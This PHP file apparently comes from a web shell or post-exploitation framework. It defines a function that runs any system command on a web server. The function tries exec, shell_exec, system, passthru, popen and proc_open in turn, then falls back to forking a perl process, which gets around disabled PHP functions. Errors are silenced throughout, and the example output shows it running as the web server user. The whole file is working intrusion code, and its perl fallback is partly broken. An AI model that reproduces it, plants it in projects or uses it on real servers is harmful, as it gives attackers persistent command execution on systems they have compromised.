<?

// execute($cmd) (type => string):
//      Try any way to execute the given system command.
//      The command output is returned by the function.
//      
//      $cmd (string):
//          The command line string to run.
//
// EXAMPLE:
//      >>> execute("whoami")
//      "www-data"
//
// TODO: This function is probably highly optimizable.

function execute($cmd)
{
    $res = '';

    if (@function_exists('exec'))
    {
        @exec($cmd, $res);
        $res = implode("\n", $res);
    }
    elseif (@function_exists('shell_exec'))
    {
        $res = @shell_exec($cmd);
    }
    elseif (@function_exists('system'))
    {
        @ob_start();
        @system($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif (@function_exists('passthru'))
    {
        @ob_start();
        @passthru($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif (@is_resource($f = @popen($cmd, 'r')))
    {
        if (@function_exists('fread') && @function_exists('feof'))
        {
            while (!@feof($f))
                $res .= @fread($f, 1024);
        }
        elseif (@function_exists('fgets') && @function_exists('feof'))
        {
            while (!@feof($f))
                $res .= @fgets($f, 1024);
        }
        @pclose($f);
    }
    elseif (@is_resource($f = @proc_open($cmd, array(1 => array("pipe", "w")), $pipes)))
    {
        if (@function_exists('fread') && @function_exists('feof'))
        {
            while (!@feof($pipes[1]))
                $res .= @fread($pipes[1], 1024);
        }
        elseif (@function_exists('fgets') && @function_exists('feof'))
        {
            while (!@feof($pipes[1]))
                $res .= @fgets($pipes[1],1024);
        }
        @proc_close($f);
    }
    elseif (@function_exists('pcntl_exec') && @function_exists('pcntl_fork'))
    {
        $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
        $pid = @pcntl_fork();
        if ($pid == -1)
            $res .= '[-] Could not children fork. Exit';
        elseif ($pid)
        {
            if (@pcntl_wifexited($status))
                $res .= '[+] Done! Command "' . $cmd . '" successfully executed.';
            else
                $res .= '[-] Error. Command incorrect.';
        }
        else
        {
            $cmd = array(" -e 'system(\"$cmd\")'");
            if (@pcntl_exec('/usr/bin/perl', $cmd))
                exit (0);
            if (@pcntl_exec('/usr/local/bin/perl', $cmd))
                exit (0);
            die ();
        }
    }
    if (!is_string($res) || empty($res))
        return ("");
    return ($res);
}

?>
